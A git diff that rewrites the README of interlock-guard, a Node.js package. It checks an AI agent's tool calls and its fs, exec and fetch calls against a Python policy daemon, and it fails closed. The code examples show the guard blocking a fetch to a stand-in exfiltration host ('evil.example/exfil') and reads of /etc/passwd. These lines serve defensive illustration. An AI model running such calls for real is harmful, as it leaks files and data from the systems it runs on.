@@ -1,232 +1,320 @@
-# interlock-guard (Node.js)
+# interlock-guard for Node.js
 
-Guard a Node.js agent's MCP tool calls with the **same policy engine** the Python
-[`interlock`](../README.md) SDK uses. The JS side enforces; a Python sidecar
-decides.
+Guard a Node.js agent's tool calls with **the same policy engine** the Python
+[interlock](../README.md) library uses.
 
-This is not a port. There is one engine, one set of rules, one policy — the
-Python one. A `interlock-sidecar` process owns it and answers a narrow RPC over a
-unix socket; this package speaks that wire and blocks an outbound tool call
-*before* it reaches the server, using the verdict that process returns. Nothing
-about policy crosses the language boundary, and there is no second implementation
-to drift.
+This is not a port. There is one engine and one set of rules, and both live in
+Python. You run a small Python daemon, `interlock-sidecar`, next to your Node.js
+agent. Before each guarded call, this package sends the call to the daemon over
+a unix socket and gets back a verdict: allow, block, or rewrite. The call only
+runs if the verdict allows it. Because there's no second implementation, the
+JS side can't drift from the Python one.
 
-## Before you install: this package needs a daemon
+Use it when your agent is written in Node.js and you want the same guardrails
+(and the same rules) as your Python services.
 
-**Fail-closed is the whole contract, so read this first.** There is no bundled
-engine. If the daemon is not running — or not reachable, or it dies mid-session —
-**every guarded call is denied** with a `BlockedError`. Not a warning, not a
-pass-through, not a special case a caller has to know about: an agent with no
-daemon **does not act at all**.
-
-That includes `monitor` mode. An unreachable daemon is an *infrastructure
-failure*, not a policy verdict, so it is not downgraded into a silent allow.
-
-This is the deployment trade, stated rather than hidden: a Python process must be
-deployed beside the JS agent, and "is the daemon up?" becomes a hard availability
-dependency. If that trade is wrong for you, this package is wrong for you.
+> **Warning: this package needs a running daemon, and it fails closed.**
+> There is no engine bundled in the JS package. If the daemon isn't running,
+> can't be reached, or dies mid-session, **every guarded call is denied** with a
+> `BlockedError`. No warning, no pass-through. An agent without its daemon does
+> not act at all.
+>
+> This includes `monitor` mode. An unreachable daemon is an infrastructure
+> failure, not a policy decision, so it is never turned into a silent allow.
+>
+> The trade-off: you must deploy a Python process beside your JS agent, and
+> "is the daemon up?" becomes a hard availability dependency. If that doesn't
+> work for you, this package isn't the right fit.
 
 ## Install
 
+The package is **not on npm yet**. Build it from this repository:
+
 ```bash
-npm install interlock-guard
+cd js
+npm install
+npm run build          # compiles src/ to dist/
 ```
 
-Not yet published to npm; from the monorepo it builds in place (see
-[Development](#development)). Requires Node ≥20 and the Python `interlock`
-package for the daemon — `pip install interlock-guard`.
+You need Node.js 20 or newer, and the Python package for the daemon:
 
-Zero runtime dependencies. `tsc` is the only build tool and `node:test` the only
-test runner.
+```bash
+pip install "git+https://github.com/SourceShift/InterLock.git"
+```
+
+The JS package has no runtime dependencies. It is **ESM only** (there is no
+CommonJS build).
 
 ## Start the daemon
 
-The daemon ships in the Python package:
+The daemon ships with the Python package. Point it at the rules you want to
+enforce:
 
 ```bash
-interlock-sidecar \
-  --rules my_service.policies:RULES \
-  --socket /tmp/il-guard.sock
+interlock-sidecar --rules my_service.policies:RULES --socket "$HOME/.interlock/guard.sock"
 ```
 
-`--rules` is a `module:attribute` naming the rule set to load. A non-empty rule
-set is **required**: `get_engine()` lazily *creates* an empty engine, and an empty
-engine allows everything, so inheriting that default would be a guard that looks
-healthy while enforcing nothing. The socket is created `0600` inside a `0700`
-directory; the path is part of the trust boundary.
+> **Note**
+> Don't put the socket directly in `/tmp`. The daemon refuses a shared
+> directory (world-writable or sticky, like `/tmp`) and never changes its
+> permissions. Use a directory you own, like `~/.interlock/` above.
 
-## Quickstart
+`--rules` takes a `module:attribute` path to your rule set, which is written in
+Python (see [Writing rules](../docs/guides/writing-rules.md)). The daemon refuses
+to start with an empty rule set, because an empty engine allows everything and
+would look healthy while enforcing nothing.
+
+The socket is created with `0600` permissions inside a `0700` directory. Whoever
+can open the socket can ask for verdicts, so treat its path as part of your
+security boundary. Every flag is documented in the
+[sidecar reference](../docs/reference/sidecar.md).
+
+## Guard an MCP client
+
+Wrap your MCP client once. Every `callTool` is then checked before it reaches
+the server.
 
 ```ts
+import { homedir } from "node:os";
+import { join } from "node:path";
 import { Client } from "@modelcontextprotocol/sdk/client/index.js";
 import { BlockedError, RemoteEngine, guardMcpSession } from "interlock-guard";
 
-const engine = new RemoteEngine("/tmp/il-guard.sock", { timeout: 5 });
+const engine = new RemoteEngine(join(homedir(), ".interlock", "guard.sock"), { timeout: 5 });
 const client = new Client({ name: "my-agent", version: "1.0.0" });
 
 guardMcpSession(client, { engine });
 
 await client.callTool({ name: "echo", arguments: { text: "hi" } });
-// the policy allowed it; the call reached the server
+// allowed: the call reached the server
 
 await client.callTool({ name: "read_file", arguments: { path: "/etc/passwd" } });
-// throws BlockedError - the server never heard the call
+// throws BlockedError: blocked action 'read_file': ...
+// the server never heard about the call
 ```
 
-`guardMcpSession` duck-types `.callTool`; it never imports the MCP SDK. The
-official `@modelcontextprotocol/sdk` `Client` drops in unchanged, and so does any
-client exposing the same `callTool({ name, arguments })` shape.
+`guardMcpSession` doesn't import the MCP SDK. It wraps any object with a
+`callTool({ name, arguments })` method, so the official `Client` works unchanged
+and so does a test double. Results are checked too, on the way back.
 
-For a transport other than MCP, the pair underneath it is exported directly:
+> **Note:** `RemoteEngine` waits at most `timeout` seconds for the connection
+> and for each reply. The default is 5 seconds (`DEFAULT_TIMEOUT_SECONDS`). When
+> it runs out, the call fails closed with a `BlockedError` (`no reply within 5s`),
+> so a hung daemon blocks calls instead of hanging them. The timer only runs
+> while a reply is pending, so an idle pause between calls never trips it. Pass
+> `{ timeout: null }` to wait without limit, which you should only do in tests.
+
+When a call is blocked, the `BlockedError` carries the whole decision, so you can
+log why:
+
+```ts
+try {
+  await client.callTool({ name: "read_file", arguments: { path: "/etc/passwd" } });
+} catch (err) {
+  if (err instanceof BlockedError) {
+    console.log(err.action);                  // "read_file"
+    console.log(err.decision.reason);         // why the policy said no
+    console.log(err.decision.policy_id);      // which rule
+    console.log(err.decision.attributed_to);  // which argument, e.g. "path"
+  }
+}
+```
+
+## Guard any tool call
+
+If your agent doesn't use MCP, call the two functions underneath
+`guardMcpSession` yourself, before and after running a tool:
 
 ```ts
 import { enforceToolCall, enforceToolResult } from "interlock-guard";
 
-const safeArgs = await enforceToolCall("shell", { cmd }, { engine });   // MODIFY merges
-const output   = await enforceToolResult("shell", result, { engine });  // MODIFY replaces
+const safeArgs = await enforceToolCall("shell", { cmd }, { engine });
+const output = await runShell(safeArgs);
+const safeOutput = await enforceToolResult("shell", output, { engine });
 ```
 
-`enforceToolCall` returns a **copy** of the arguments with any `modified_args`
-merged in — the caller's object is never mutated. `enforceToolResult` returns the
-*original* result on ALLOW (the `{ result: … }` payload it shows the policy is a
-view, never the value that leaks out) and replaces it only on MODIFY.
+- `enforceToolCall` returns a **copy** of the arguments, with any rewrite merged
+  in. Your original object is never changed.
+- `enforceToolResult` returns the original result when allowed, and a
+  replacement when the policy rewrote it. (The policy sees the result wrapped as
+  `{ result: ... }` when it isn't an object. That wrapper never leaks out to you.)
+- Both throw `BlockedError` on a block. Blocking a result doesn't undo the tool:
+  it has already run. It only keeps the output away from your agent.
 
-Both throw `BlockedError`, which carries the whole `Decision` — so a caller that
-already catches it can read `policy_id` and `attributed_to` without a second
-channel.
+Pass `enforcement: "monitor"` to record decisions without acting on them, and
+`principal: "acme/agent42"` to say who is acting.
 
-## Guarding native effects
+## Guard your app's fs, exec, and fetch calls
 
-An agent's blast radius is not only its tool calls — it is `fs`, `child_process`,
-and outbound `fetch`. `installInterceptors` patches those for the process and
-decides each one **before the effect**:
+Tool calls aren't the only risk. An agent can also read files, run commands, and
+send HTTP requests directly. `installInterceptors` patches those functions for
+the whole process and checks each one **before it happens**:
 
 ```ts
+import fs from "node:fs";
+import { homedir } from "node:os";
+import { join } from "node:path";
 import { RemoteEngine, installInterceptors } from "interlock-guard";
 
-const engine = new RemoteEngine("/tmp/il-guard.sock", { timeout: 5 });
+const engine = new RemoteEngine(join(homedir(), ".interlock", "guard.sock"), { timeout: 5 });
 const interceptors = installInterceptors({ engine });
 
-interceptors.covered;    // "fs.readFile", "fs.rm", …, "child_process.exec", "http.fetch"
-interceptors.uncovered;  // the holes below - named, not assumed away
+interceptors.covered;    // ["child_process.exec", "child_process.execFile", "fs.access", ..., "http.fetch"]
+interceptors.uncovered;  // what can't be guarded (see below)
 
-await fs.promises.readFile("/etc/passwd");  // BlockedError; the file is never read
-await fetch("http://evil.example/exfil");   // BlockedError; nothing leaves the process
+await fs.promises.readFile("/etc/passwd");  // BlockedError: the file is never read
+await fetch("http://evil.example/exfil");   // BlockedError: nothing leaves the process
 
 interceptors.uninstall();  // restores every patched function
 ```
 
-The action names are namespaced — `fs.readFile`, `child_process.exec`,
-`http.fetch` — so a rule reads `event.action == "fs.rm"` and
-`event.args["path"]`, and a raw egress call is distinguishable from an MCP tool
-that happens to be named `fetch`. A MODIFY rewrites the argument (`path`,
-`command`, `url`) and the rewritten value is what the effect uses.
+Pass `{ fs: false }`, `{ exec: false }`, or `{ http: false }` to skip a group.
 
-For a model SDK (Anthropic, OpenAI, or a home-grown loop), guard the seam the
-application already has — the runner or the tool map:
+Each effect reaches your rules as an action with a namespaced name, so a raw
+`fetch` can't be confused with an MCP tool that happens to be called `fetch`:
+
+| Action | Arguments your rule sees |
+|---|---|
+| `fs.readFile`, `fs.writeFile`, `fs.rm`, `fs.rename`, … (22 in total) | `path`, plus `data`, `dest`, `options`, etc. where the function takes them |
+| `child_process.exec` | `command`, `options` |
+| `child_process.execFile` | `command` (the file), `args`, `options` |
+| `http.fetch` | `url`, plus `method`, `headers`, `body` when given |
+
+A Python rule then reads `event.action == "fs.rm"` and `event.args["path"]`. A
+rewrite changes the argument (`path`, `command`, `url`), and the effect uses the
+rewritten value.
+
+## Guard a model SDK's tools
+
+If your agent calls tools through a model SDK (Anthropic, OpenAI, or your own
+loop), guard the place where your code runs the tool the model asked for:
 
 ```ts
 import { guardToolMap, guardToolRunner } from "interlock-guard";
 
+// a { name: fn } record of tool functions
 const tools = guardToolMap({ read_file, shell, search }, { engine });
-// or, for a (name, args) => result dispatcher:
+
+// or a (name, args) => result dispatcher
 const run = guardToolRunner(myDispatcher, { engine });
 ```
 
-Nothing imports a model SDK; both shapes funnel through the same
-`enforceToolCall` / `enforceToolResult` core, so one rule enforces identically
-whether the agent speaks MCP, a model SDK, or a raw loop.
+Neither imports a model SDK. Both check the call before it runs **and** the
+result after, through the same `enforceToolCall` / `enforceToolResult` used
+everywhere else. So one rule behaves the same whether your agent uses MCP, a
+model SDK, or a hand-written loop.
 
-## What is not guarded
+For `guardToolMap`: when a tool's first argument is a plain object, that object
+is what the policy sees and rewrites. Any other first argument (a string, a
+`Buffer`, nothing) is shown to the policy as `{ input: ... }`.
 
-Some of Node's surface cannot be reached by any pure-JS patch. These are
-permanent, so they are **named** — `installInterceptors().uncovered` returns them
-— rather than left for a deployer to assume are covered.
+## What can't be guarded
+
+Some parts of Node can't be reached by any patch written in JavaScript. These
+gaps are permanent, so they're listed by name in `installInterceptors().uncovered`
+(and in the exported `UNGUARDABLE` array) rather than left for you to discover.
 
 - **ESM named imports.** `import { readFile } from "node:fs"` and
-  `import * as fs from "node:fs"` bind to the original function at *link time*;
-  no patch can redirect them. Only `require("node:fs")` (CJS) and
-  `import fs from "node:fs"` (a **default** import, which is the same CJS object)
-  see the interceptor. Guarding an agent means running it with a default import
-  (or CJS) for these modules — there is no way around this from inside the
-  process.
-- **Synchronous and handle-returning calls.** A guard must *await* the verdict
-  before the effect, so anything that must return a value *now* is out of reach:
-  every `*Sync` (`readFileSync`, `rmSync`, …), the openers that return a live
-  handle (`fs.open`, `fs.opendir`, `fs.createReadStream`, `fs.createWriteStream`,
-  `child_process.spawn`, `child_process.fork`), the other `*Sync` process calls,
-  and `http.request` / `https.request` (they return a `ClientRequest`
-  synchronously). `child_process.exec` and `execFile` *are* guarded because their
-  return value is conventionally ignored — the result arrives through the
-  callback.
-- **Result-phase rules on native effects.** The native interceptors decide the
-  **call**, not the return value. An `fs` call can hand back a `Stats`, a
-  `Dirent`, or a stream — objects with no wire form — so inspecting the result
-  would turn an ordinary `fs.stat` into a fail-closed block. Result-phase
-  redaction lives on the MCP and model-SDK paths (`enforceToolResult`), where the
-  value is a tool payload.
+  `import * as fs from "node:fs"` are bound to the original function when the
+  module loads, and no patch can redirect them. Only `require("node:fs")` and a
+  **default** import (`import fs from "node:fs"`, which is the same object) see
+  the interceptor. Write your agent's file and process code with default imports
+  or `require`.
+- **Synchronous calls and calls that return a handle.** A guard has to wait for
+  the daemon's verdict before the effect, so anything that must return a value
+  immediately is out of reach:
+  - every `*Sync` function (`readFileSync`, `rmSync`, `execSync`, …)
+  - functions that return a live handle or stream: `fs.open`, `fs.opendir`,
+    `fs.createReadStream`, `fs.createWriteStream`, `child_process.spawn`,
+    `child_process.fork`
+  - `http.request`, `http.get`, `https.request`, `https.get`, which return a
+    request object synchronously
 
-## Subpath exports
+  `child_process.exec` and `execFile` **are** guarded, because their result
+  arrives through a callback and their return value is normally ignored.
+- **Result checks on fs, exec, and fetch.** The interceptors check the call, not
+  what it returns. An `fs` call can return a `Stats`, a `Dirent`, or a stream,
+  which can't be sent to the daemon, so checking results would turn an ordinary
+  `fs.stat` into a block. Result checks and redaction happen on the MCP and
+  model-SDK paths, where the result is a tool payload.
 
-| Import | What |
-|---|---|
-| `interlock-guard` | everything |
-| `interlock-guard/wire` | the protocol: canonical JSON, the value codec, frames, `WireError` |
-| `interlock-guard/mcp` | `enforceToolCall`, `enforceToolResult`, `guardMcpSession` |
-
-## Documented limits
+## Limits
 
 - **Async only.** Node has no synchronous unix-socket client, so
-  `RemoteEngine.evaluate(event)` returns a `Promise<Decision>`. The honest
-  consequence: **a synchronous JS tool call cannot be guarded**, because there is
-  no synchronous transport to guard it with. MCP's `callTool` is already async, so
-  the interceptor fits.
-- **One connection, serialized.** A request/response exchange on a stream socket
-  cannot be interleaved, so concurrent guarded calls queue behind one another on
-  the single connection rather than racing on it. One `RemoteEngine` is one
-  round trip in flight.
-- **A round trip plus two JSON encodes per guarded call.** `npm run bench` prints
-  it: on the development machine, a guarded call measured ~47 µs/call against a
-  ~0.4 µs no-guard baseline (and ~26 µs on an earlier, less loaded run — the
-  number is a smoke figure, not a stated methodology; R12 owns the methodology
-  and the regression gate). Each native `fs` / `exec` / `fetch` the interceptors
-  guard adds one such round trip.
-- **Some JS values are refused, not coerced.** `undefined`, `NaN`/`±Infinity`, a
-  `bigint`, a `Map`/`Date`/class instance, and a `Symbol`-keyed object raise
-  `Unrepresentable`. These are the values `JSON.stringify` would silently *drop*
-  or *corrupt* — handing the engine an event with no opinion, which allows.
-  Refusing turns a silent allow into a loud block. Bytes (`Buffer`/`Uint8Array`)
-  and `Set`s cross the wire; everything else is strict JSON.
-- **No receipt is emitted.** The Python interceptor signs an execution receipt;
-  here the *daemon* already recorded the decision when it answered. A JS receipt
-  would double-record one decision into a chain this side cannot sign.
-- **ESM only**, no CJS build. Not yet published to npm.
+  `RemoteEngine.evaluate()` returns a promise. A synchronous JS tool function
+  can't be guarded, because there's no synchronous way to ask the daemon. MCP's
+  `callTool` is already async, so it fits.
+- **One connection, one call at a time.** A `RemoteEngine` holds a single socket
+  connection, and requests on it can't be interleaved. Concurrent guarded calls
+  queue behind each other instead of racing. Create more `RemoteEngine`s if you
+  need more in flight.
+- **Each guarded call costs a round trip.** `npm run bench` prints the overhead.
+  On the development machine it measured about 47 µs per guarded call, against
+  about 0.4 µs unguarded (an earlier, less loaded run measured about 26 µs).
+  Treat this as a smoke number, not a benchmark: the overhead benchmark with a
+  stated method is still on the [roadmap](../ROADMAP.md). Every guarded `fs`,
+  `exec`, or `fetch` call adds one round trip.
+- **Some values are refused instead of converted.** `undefined`, `NaN`,
+  `±Infinity`, `bigint`, `Map`, `Date`, class instances, and objects with
+  `Symbol` keys throw `Unrepresentable`. These are values `JSON.stringify` would
+  silently drop or corrupt, which could hand the engine an event with nothing to
+  object to, and so allow it. Refusing turns that silent allow into a visible
+  block. Bytes (`Buffer`, `Uint8Array`) and `Set`s are supported; everything else
+  must be plain JSON.
+- **No audit receipts from JS.** The Python side writes a signed receipt for each
+  decision. Here the daemon already records the decision when it answers (start
+  it with `--receipts`), so the JS client doesn't write a second, unsigned copy.
+- **ESM only, Node 20+, not yet on npm.**
+
+## Imports
+
+| Import | What you get |
+|---|---|
+| `interlock-guard` | everything |
+| `interlock-guard/mcp` | `enforceToolCall`, `enforceToolResult`, `guardMcpSession` |
+| `interlock-guard/wire` | the protocol: canonical JSON, the value codec, frames, `WireError`, `Unrepresentable` |
 
 ## Development
 
 ```bash
 npm install
-npm run build          # tsc -p tsconfig.build.json   -> dist/
-npm test               # tsc -p tsconfig.test.json && node --test -> dist-test/
+npm run build          # tsc -p tsconfig.build.json  -> dist/
+npm test               # tsc -p tsconfig.test.json && node --test  -> dist-test/
 npm run bench          # the guarded round-trip smoke number
 ```
 
-`npm test` spawns the **real** Python daemon and, if it cannot start one, **fails**
-with the daemon's stderr rather than skipping — a skipped conformance test is a
-green suite that proves nothing. Override the interpreter with `PYTHON=…` (the
-default is `python3`).
+`npm test` starts the **real** Python daemon. If it can't start one, the suite
+**fails** and prints the daemon's stderr instead of skipping, because a skipped
+conformance test is a green suite that proves nothing. Set `PYTHON=...` to choose
+the interpreter (the default is `python3`).
 
-The suite's centre of gravity is `test/corpus.test.ts`, which replays
-[`tests/conformance/events.json`](../tests/conformance/events.json) — the same
-frozen corpus the Python suite replays. It is the interface between the two
-languages: 13 cases and 9 protocol negatives, each asserting that this client's
-view of a decision matches the engine's. `test/mcp_sdk.test.ts` goes the other
-way and wraps a real `@modelcontextprotocol/sdk` `Client` over an in-memory
-transport. `test/fs.test.ts`, `test/exec.test.ts`, and `test/http.test.ts` drive
-the native interceptors against a real daemon (and, for HTTP, a real server that
-proves a blocked request never leaves the process); `test/install.test.ts` pins
-the coverage report and a complete `uninstall`; `test/model.test.ts` covers the
-model-SDK seam.
+What the tests cover:
+
+- `test/corpus.test.ts` is the centre of the suite. It replays
+  [`tests/conformance/events.json`](../tests/conformance/events.json), the same
+  frozen corpus the Python tests replay: 13 cases and 9 protocol negatives, each
+  checking that this client reads a decision exactly as the engine made it. This
+  corpus is the contract between the two languages.
+- `test/mcp_sdk.test.ts` wraps a real `@modelcontextprotocol/sdk` `Client` over
+  an in-memory transport.
+- `test/fs.test.ts`, `test/exec.test.ts`, and `test/http.test.ts` drive the
+  interceptors against a real daemon. The HTTP test uses a real server to prove a
+  blocked request never leaves the process.
+- `test/install.test.ts` pins the coverage report and checks that `uninstall`
+  restores everything.
+- `test/model.test.ts` covers `guardToolMap` and `guardToolRunner`.
+- `test/client.test.ts`, `test/mcp.test.ts`, and `test/wire.test.ts` cover the
+  client, the MCP wrapper, and the protocol codec.
+- `test/timeout.test.ts` checks the default timeout and the `timeout: null`
+  opt-out, that a daemon which never replies blocks the call once the timeout
+  runs out, and that an idle pause between calls doesn't trip the reply timer.
+
+## Learn more
+
+- [interlock README](../README.md): what interlock is and how the Python side works
+- [Concepts](../docs/concepts.md): events, rules, verdicts, and phases
+- [Writing rules](../docs/guides/writing-rules.md): the Python rules this package enforces
+- [Sidecar reference](../docs/reference/sidecar.md): every daemon flag and the wire protocol
 
 ## License
 
